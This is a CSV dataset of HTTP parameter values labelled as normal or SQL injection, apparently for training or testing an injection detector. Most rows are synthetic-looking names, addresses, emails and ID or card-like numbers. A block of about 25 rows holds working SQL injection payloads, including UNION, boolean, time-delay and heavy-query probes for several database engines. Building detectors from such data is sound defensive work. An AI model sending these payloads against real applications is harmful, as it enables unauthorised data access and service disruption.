content,attack_type,source,source_uid,orig_attack_type_label
apotrerar,0,external_httpparamsdataset,external_httpparamsdataset_387,norm
mochn quer,0,external_httpparamsdataset,external_httpparamsdataset_388,norm
peller@arvigar.gs,0,external_httpparamsdataset,external_httpparamsdataset_389,norm
30503437d,0,external_httpparamsdataset,external_httpparamsdataset_390,norm
"carrer asturies, 49",0,external_httpparamsdataset,external_httpparamsdataset_391,norm
49135,0,external_httpparamsdataset,external_httpparamsdataset_392,norm
8582534834926521,0,external_httpparamsdataset,external_httpparamsdataset_393,norm
aghili,0,external_httpparamsdataset,external_httpparamsdataset_394,norm
escultrico,0,external_httpparamsdataset,external_httpparamsdataset_395,norm
colunga corrius,0,external_httpparamsdataset,external_httpparamsdataset_396,norm
bukoontot@google-movil.cm,0,external_httpparamsdataset,external_httpparamsdataset_397,norm
69634179t,0,external_httpparamsdataset,external_httpparamsdataset_398,norm
c/ asuncion 115 5e,0,external_httpparamsdataset,external_httpparamsdataset_399,norm
almonacid de la sierra,0,external_httpparamsdataset,external_httpparamsdataset_400,norm
6689689469452036,0,external_httpparamsdataset,external_httpparamsdataset_401,norm
rorke,0,external_httpparamsdataset,external_httpparamsdataset_402,norm
3u23pe,0,external_httpparamsdataset,external_httpparamsdataset_403,norm
3318,0,external_httpparamsdataset,external_httpparamsdataset_404,norm
philippa,0,external_httpparamsdataset,external_httpparamsdataset_405,norm
carroar,0,external_httpparamsdataset,external_httpparamsdataset_406,norm
salgado pladellorens,0,external_httpparamsdataset,external_httpparamsdataset_407,norm
schwab.carli@emepleo.info,0,external_httpparamsdataset,external_httpparamsdataset_408,norm
"calle batalla de muhlberg, 25, 6?a",0,external_httpparamsdataset,external_httpparamsdataset_409,norm
villadoz,0,external_httpparamsdataset,external_httpparamsdataset_410,norm
27860,0,external_httpparamsdataset,external_httpparamsdataset_411,norm
brenda,0,external_httpparamsdataset,external_httpparamsdataset_412,norm
8ienne2s6,0,external_httpparamsdataset,external_httpparamsdataset_413,norm
alpar-ornstein@rockefeller.nu,0,external_httpparamsdataset,external_httpparamsdataset_414,norm
15423399j,0,external_httpparamsdataset,external_httpparamsdataset_415,norm
horcajo de montemayor,0,external_httpparamsdataset,external_httpparamsdataset_416,norm
46844,0,external_httpparamsdataset,external_httpparamsdataset_417,norm
gourley,0,external_httpparamsdataset,external_httpparamsdataset_418,norm
sensualmente,0,external_httpparamsdataset,external_httpparamsdataset_419,norm
consalve,0,external_httpparamsdataset,external_httpparamsdataset_420,norm
c406l2n5,0,external_httpparamsdataset,external_httpparamsdataset_421,norm
fabrizio,0,external_httpparamsdataset,external_httpparamsdataset_422,norm
kunneke@storagecraft.nz,0,external_httpparamsdataset,external_httpparamsdataset_423,norm
89740217j,0,external_httpparamsdataset,external_httpparamsdataset_424,norm
"c/ gravina, s/n",0,external_httpparamsdataset,external_httpparamsdataset_425,norm
igzquiza,0,external_httpparamsdataset,external_httpparamsdataset_426,norm
17867,0,external_httpparamsdataset,external_httpparamsdataset_427,norm
6453670410602968,0,external_httpparamsdataset,external_httpparamsdataset_428,norm
zandra,0,external_httpparamsdataset,external_httpparamsdataset_429,norm
agenor,0,external_httpparamsdataset,external_httpparamsdataset_430,norm
iraola rudi,0,external_httpparamsdataset,external_httpparamsdataset_431,norm
chamberlain@muevemiweb.al,0,external_httpparamsdataset,external_httpparamsdataset_432,norm
calle jaime ferranz 51,0,external_httpparamsdataset,external_httpparamsdataset_433,norm
castellanos de zapardiel,0,external_httpparamsdataset,external_httpparamsdataset_434,norm
12163,0,external_httpparamsdataset,external_httpparamsdataset_435,norm
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,external_httpparamsdataset,external_httpparamsdataset_436,sqli
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",1,external_httpparamsdataset,external_httpparamsdataset_437,sqli
-3136%') or 3400=6002,1,external_httpparamsdataset,external_httpparamsdataset_438,sqli
1) where 7956=7956 or sleep(5)#,1,external_httpparamsdataset,external_httpparamsdataset_439,sqli
-7387'))) order by 1--,1,external_httpparamsdataset,external_httpparamsdataset_440,sqli
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,1,external_httpparamsdataset,external_httpparamsdataset_441,sqli
"1))) union all select null,null,null#",1,external_httpparamsdataset,external_httpparamsdataset_442,sqli
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",1,external_httpparamsdataset,external_httpparamsdataset_443,sqli
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",1,external_httpparamsdataset,external_httpparamsdataset_444,sqli
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1,external_httpparamsdataset,external_httpparamsdataset_445,sqli
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",1,external_httpparamsdataset,external_httpparamsdataset_446,sqli
-2604)) as sekb where 6897=6897 or 1000=7683,1,external_httpparamsdataset,external_httpparamsdataset_447,sqli
"1%""))) waitfor delay '0:0:5'--",1,external_httpparamsdataset,external_httpparamsdataset_448,sqli
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",1,external_httpparamsdataset,external_httpparamsdataset_449,sqli
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1,external_httpparamsdataset,external_httpparamsdataset_450,sqli
"1%"");select benchmark(5000000,md5(0x714e4153))#",1,external_httpparamsdataset,external_httpparamsdataset_451,sqli
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,external_httpparamsdataset,external_httpparamsdataset_452,sqli
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",1,external_httpparamsdataset,external_httpparamsdataset_453,sqli
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1,external_httpparamsdataset,external_httpparamsdataset_454,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",1,external_httpparamsdataset,external_httpparamsdataset_455,sqli
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,1,external_httpparamsdataset,external_httpparamsdataset_456,sqli
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",1,external_httpparamsdataset,external_httpparamsdataset_457,sqli
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",1,external_httpparamsdataset,external_httpparamsdataset_458,sqli
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,external_httpparamsdataset,external_httpparamsdataset_459,sqli
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,external_httpparamsdataset,external_httpparamsdataset_460,sqli
8496429893525706,0,external_httpparamsdataset,external_httpparamsdataset_461,norm
tweddle,0,external_httpparamsdataset,external_httpparamsdataset_462,norm
t324a3ra5a,0,external_httpparamsdataset,external_httpparamsdataset_463,norm
4932,0,external_httpparamsdataset,external_httpparamsdataset_464,norm
sirevici,0,external_httpparamsdataset,external_httpparamsdataset_465,norm
di0cut6dor7,0,external_httpparamsdataset,external_httpparamsdataset_466,norm
jener monaj,0,external_httpparamsdataset,external_httpparamsdataset_467,norm
90230020p,0,external_httpparamsdataset,external_httpparamsdataset_468,norm
los polancos 133,0,external_httpparamsdataset,external_httpparamsdataset_469,norm
"pintanos, los",0,external_httpparamsdataset,external_httpparamsdataset_470,norm
6034871098442134,0,external_httpparamsdataset,external_httpparamsdataset_471,norm
berrisfo,0,external_httpparamsdataset,external_httpparamsdataset_472,norm
zaguero,0,external_httpparamsdataset,external_httpparamsdataset_473,norm
vingelli9@custombikesclothes.fr,0,external_httpparamsdataset,external_httpparamsdataset_474,norm
39202408n,0,external_httpparamsdataset,external_httpparamsdataset_475,norm
"c/ montaer ruiz, 24, 12a",0,external_httpparamsdataset,external_httpparamsdataset_476,norm
fuentelmonge,0,external_httpparamsdataset,external_httpparamsdataset_477,norm
3609841962548925,0,external_httpparamsdataset,external_httpparamsdataset_478,norm
isador,0,external_httpparamsdataset,external_httpparamsdataset_479,norm
m*ule38,0,external_httpparamsdataset,external_httpparamsdataset_480,norm
4906,0,external_httpparamsdataset,external_httpparamsdataset_481,norm
marcanti,0,external_httpparamsdataset,external_httpparamsdataset_482,norm
cimorra,0,external_httpparamsdataset,external_httpparamsdataset_483,norm
jezabel,0,external_httpparamsdataset,external_httpparamsdataset_484,norm
pawluszek segu,0,external_httpparamsdataset,external_httpparamsdataset_485,norm
knippenberg@soyriojano.cf,0,external_httpparamsdataset,external_httpparamsdataset_486,norm
05782219l,0,external_httpparamsdataset,external_httpparamsdataset_487,norm
"c/ ricardo codoer, 112,",0,external_httpparamsdataset,external_httpparamsdataset_488,norm
iza,0,external_httpparamsdataset,external_httpparamsdataset_489,norm
brunhild,0,external_httpparamsdataset,external_httpparamsdataset_490,norm
te3496,0,external_httpparamsdataset,external_httpparamsdataset_491,norm
martinn sampayo,0,external_httpparamsdataset,external_httpparamsdataset_492,norm
allaert@chicasdiabolo.ru,0,external_httpparamsdataset,external_httpparamsdataset_493,norm
63974696n,0,external_httpparamsdataset,external_httpparamsdataset_494,norm
"calle plantio, 178,",0,external_httpparamsdataset,external_httpparamsdataset_495,norm
fla,0,external_httpparamsdataset,external_httpparamsdataset_496,norm
50629,0,external_httpparamsdataset,external_httpparamsdataset_497,norm
benning,0,external_httpparamsdataset,external_httpparamsdataset_498,norm
demostrar,0,external_httpparamsdataset,external_httpparamsdataset_499,norm
6212,0,external_httpparamsdataset,external_httpparamsdataset_500,norm
sask,0,external_httpparamsdataset,external_httpparamsdataset_501,norm
refriega,0,external_httpparamsdataset,external_httpparamsdataset_502,norm
isidoro,0,external_httpparamsdataset,external_httpparamsdataset_503,norm
rudie@deuxmanagement.jo,0,external_httpparamsdataset,external_httpparamsdataset_504,norm
06918701w,0,external_httpparamsdataset,external_httpparamsdataset_505,norm
"calle la caldera, 76 11-c",0,external_httpparamsdataset,external_httpparamsdataset_506,norm
guilas,0,external_httpparamsdataset,external_httpparamsdataset_507,norm
4898771590601702,0,external_httpparamsdataset,external_httpparamsdataset_508,norm
lap,0,external_httpparamsdataset,external_httpparamsdataset_509,norm
ramblizo,0,external_httpparamsdataset,external_httpparamsdataset_510,norm
42287106l,0,external_httpparamsdataset,external_httpparamsdataset_511,norm
"calle beato tomas de zumarraga, 89 12-c",0,external_httpparamsdataset,external_httpparamsdataset_512,norm
8043015940180984,0,external_httpparamsdataset,external_httpparamsdataset_513,norm
olsen,0,external_httpparamsdataset,external_httpparamsdataset_514,norm
5urgui8a,0,external_httpparamsdataset,external_httpparamsdataset_515,norm
6087,0,external_httpparamsdataset,external_httpparamsdataset_516,norm
spindler1,0,external_httpparamsdataset,external_httpparamsdataset_517,norm
trincha-32r1,0,external_httpparamsdataset,external_httpparamsdataset_518,norm
stoeckel@hacia.sa,0,external_httpparamsdataset,external_httpparamsdataset_519,norm
08363269d,0,external_httpparamsdataset,external_httpparamsdataset_520,norm
"alqueria de pixarroda, 27",0,external_httpparamsdataset,external_httpparamsdataset_521,norm
tossa de mar,0,external_httpparamsdataset,external_httpparamsdataset_522,norm
0277189059505279,0,external_httpparamsdataset,external_httpparamsdataset_523,norm
dotan,0,external_httpparamsdataset,external_httpparamsdataset_524,norm
rescisorio,0,external_httpparamsdataset,external_httpparamsdataset_525,norm
terribas,0,external_httpparamsdataset,external_httpparamsdataset_526,norm
leftwich@sms24h.sb,0,external_httpparamsdataset,external_httpparamsdataset_527,norm
valdemaluque,0,external_httpparamsdataset,external_httpparamsdataset_528,norm
12232,0,external_httpparamsdataset,external_httpparamsdataset_529,norm
5580428033394873,0,external_httpparamsdataset,external_httpparamsdataset_530,norm
masahiro,0,external_httpparamsdataset,external_httpparamsdataset_531,norm
comba,0,external_httpparamsdataset,external_httpparamsdataset_532,norm
1140,0,external_httpparamsdataset,external_httpparamsdataset_533,norm
humfrey,0,external_httpparamsdataset,external_httpparamsdataset_534,norm
e23i6gulo,0,external_httpparamsdataset,external_httpparamsdataset_535,norm
nicolo,0,external_httpparamsdataset,external_httpparamsdataset_536,norm
brines grimalda,0,external_httpparamsdataset,external_httpparamsdataset_537,norm
floor@aebo.af,0,external_httpparamsdataset,external_httpparamsdataset_538,norm
88341714w,0,external_httpparamsdataset,external_httpparamsdataset_539,norm
"calle hernan cortes, 58,",0,external_httpparamsdataset,external_httpparamsdataset_540,norm
29639,0,external_httpparamsdataset,external_httpparamsdataset_541,norm
0052422482512057,0,external_httpparamsdataset,external_httpparamsdataset_542,norm
38i2t702,0,external_httpparamsdataset,external_httpparamsdataset_543,norm
nanni-prucnal@fighting-machines.gf,0,external_httpparamsdataset,external_httpparamsdataset_544,norm
08447437c,0,external_httpparamsdataset,external_httpparamsdataset_545,norm
"c/ reina del cielo 136, 8-d",0,external_httpparamsdataset,external_httpparamsdataset_546,norm
46510,0,external_httpparamsdataset,external_httpparamsdataset_547,norm
0878247632477262,0,external_httpparamsdataset,external_httpparamsdataset_548,norm
09ca93a4i9lar,0,external_httpparamsdataset,external_httpparamsdataset_549,norm
973,0,external_httpparamsdataset,external_httpparamsdataset_550,norm
merl,0,external_httpparamsdataset,external_httpparamsdataset_551,norm
70p89c9cion958,0,external_httpparamsdataset,external_httpparamsdataset_552,norm
quintn,0,external_httpparamsdataset,external_httpparamsdataset_553,norm
